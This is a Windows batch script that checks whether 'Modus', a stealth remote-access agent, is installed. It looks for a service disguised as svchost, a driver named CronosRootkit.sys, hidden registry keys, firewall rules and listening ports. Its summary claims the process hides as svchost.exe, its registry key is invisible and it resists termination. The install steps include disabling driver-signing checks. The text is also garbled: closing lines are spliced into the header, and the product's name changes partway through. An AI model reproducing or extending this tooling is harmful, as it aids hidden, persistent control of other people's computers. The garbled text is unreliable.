@echo off
REM ============================================================================
REM Modus - System Verification Script
REM Author: Joel Aaron Guff
REM Version: 1.0
REM =======================================================================            echo [OVERALL] Modus is INSTALLED but NOT RUNNING
        )
    )
) else (
    echo [OVERALL] Modus is NOT INSTALLED
    echo.
    echo To install Modus:
    echo   1. Enable test signing: bcdedit /set testsigning on
    echo   2. Reboot system
    echo   3. Build components: build_modus.bat
    echo   4. Install: install_stealth_service.bat
)

echo.
echo For more information, see MODUS_README.md script checks the current system state and verifies Modus
REM installation without making any changes
REM ============================================================================

echo Modus - System Verification
echo ============================

echo [INFO] Checking system configuration...

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Not running as Administrator (read-only checks only)
) else (
    echo [INFO] Running with Administrator privileges
)

REM Check test signing mode
echo.
echo ============================================================================
echo Test Signing Mode
echo ============================================================================
bcdedit /enum | findstr "testsigning" | findstr "Yes" >nul
if %errorLevel% equ 0 (
    echo [OK] Test signing mode is ENABLED
) else (
    echo [WARNING] Test signing mode is DISABLED
    echo          Driver loading will fail without test signing
    echo          Run: bcdedit /set testsigning on
)

REM Check service status
echo.
echo ============================================================================
echo Service Status
echo ============================================================================
sc query svchost_net >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Network Host Service (svchost_net) is installed
    for /f "tokens=4" %%a in ('sc query svchost_net ^| findstr "STATE"') do (
        if "%%a"=="RUNNING" (
            echo [OK] Service is RUNNING
        ) else (
            echo [WARNING] Service is installed but not running (State: %%a)
        )
    )
) else (
    echo [INFO] Network Host Service is NOT installed
)

REM Check driver status
echo.
echo ============================================================================
echo Driver Status
echo ============================================================================
sc query cronos >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Cronos driver service is installed
    for /f "tokens=4" %%a in ('sc query cronos ^| findstr "STATE"') do (
        if "%%a"=="RUNNING" (
            echo [OK] Driver is RUNNING
        ) else (
            echo [WARNING] Driver is installed but not running (State: %%a)
        )
    )
) else (
    echo [INFO] Cronos driver service is NOT installed
)

REM Check files
echo.
echo ============================================================================
echo File Status
echo ============================================================================
if exist "%SystemRoot%\system32\svchost.dll" (
    echo [OK] svchost.dll is installed in System32
) else (
    echo [INFO] svchost.dll is NOT installed
)

if exist "%SystemRoot%\system32\svchost.msh" (
    echo [OK] svchost.msh configuration is installed in System32
) else (
    echo [INFO] svchost.msh configuration is NOT installed
)

if exist "%SystemRoot%\System32\drivers\CronosRootkit.sys" (
    echo [OK] CronosRootkit.sys is installed in drivers
) else if exist "%SystemRoot%\System32\drivers\Cronos.sys" (
    echo [OK] Cronos.sys is installed in drivers  
) else (
    echo [INFO] Cronos driver file is NOT installed
)

REM Check registry entries
echo.
echo ============================================================================
echo Registry Configuration
echo ============================================================================
reg query "HKLM\SYSTEM\CurrentControlSet\Services\svchost_net" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Service registry key exists
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\svchost_net\Parameters" /v ServiceDll >nul 2>&1
    if %errorLevel% equ 0 (
        echo [OK] ServiceDll parameter is configured
    ) else (
        echo [WARNING] ServiceDll parameter is missing
    )
) else (
    echo [INFO] Service registry key does NOT exist
)

REM Check netsvcs group membership
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs | findstr "svchost_net" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Service is in netsvcs group
) else (
    echo [INFO] Service is NOT in netsvcs group
)

REM Check process visibility
echo.
echo ============================================================================
echo Process Visibility
echo ============================================================================
tasklist | findstr /i svchost >nul 2>&1
if %errorLevel% equ 0 (
    echo [INFO] svchost.exe processes found:
    tasklist | findstr /i svchost | findstr /i netsvcs
    if %errorLevel% equ 0 (
        echo [OK] netsvcs svchost process is running
    ) else (
        echo [INFO] No netsvcs svchost process visible
    )
) else (
    echo [WARNING] No svchost.exe processes found
)

REM Check firewall rules
echo.
echo ============================================================================
echo Firewall Rules
echo ============================================================================
netsh advfirewall firewall show rule name="Network Host Service peer-to-peer (UDP)" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] UDP peer-to-peer firewall rule exists
) else (
    echo [INFO] UDP peer-to-peer firewall rule NOT found
)

netsh advfirewall firewall show rule name="Network Host Service management (TCP)" >nul 2>&1  
if %errorLevel% equ 0 (
    echo [OK] TCP management firewall rule exists
) else (
    echo [INFO] TCP management firewall rule NOT found
)

REM Network connectivity check
echo.
echo ============================================================================
echo Network Connectivity
echo ============================================================================
netstat -an | findstr ":16990" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Port 16990 is open/listening
) else (
    echo [INFO] Port 16990 not detected
)

netstat -an | findstr ":16991" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Port 16991 is open/listening  
) else (
    echo [INFO] Port 16991 not detected
)

REM Summary
echo.
echo ============================================================================
echo SUMMARY
echo ============================================================================

REM Count status indicators
set "ok_count=0"
set "warning_count=0" 
set "info_count=0"

REM Determine overall status
sc query svchost_net >nul 2>&1 && (
    for /f "tokens=4" %%a in ('sc query svchost_net ^| findstr "STATE"') do (
        if "%%a"=="RUNNING" (
            echo [OVERALL] Modus appears to be RUNNING
            echo.
            echo Stealth Status:
            echo   - Process: Should appear as svchost.exe in Task Manager
            echo   - Registry: Service key should be hidden in regedit
            echo   - Protection: Process should resist termination
            echo.
            echo To verify stealth operation:
            echo   1. Open Task Manager - look for svchost.exe (not meshagent)
            echo   2. Open regedit - navigate to HKLM\SYSTEM\CurrentControlSet\Services\
            echo   3. Verify svchost_net key is NOT visible
            echo   4. Try to terminate svchost.exe process (should fail)
        ) else (
            echo [OVERALL] TaskMaster is INSTALLED but NOT RUNNING
        )
    )
) || (
    echo [OVERALL] TaskMaster is NOT INSTALLED
    echo.
    echo To install TaskMaster:
    echo   1. Enable test signing: bcdedit /set testsigning on  
    echo   2. Reboot system
    echo   3. Build components: build_taskmaster.bat
    echo   4. Install service: install_stealth_service.bat
)

echo.
echo For more information, see TASKMASTER_README.md
echo.
pause
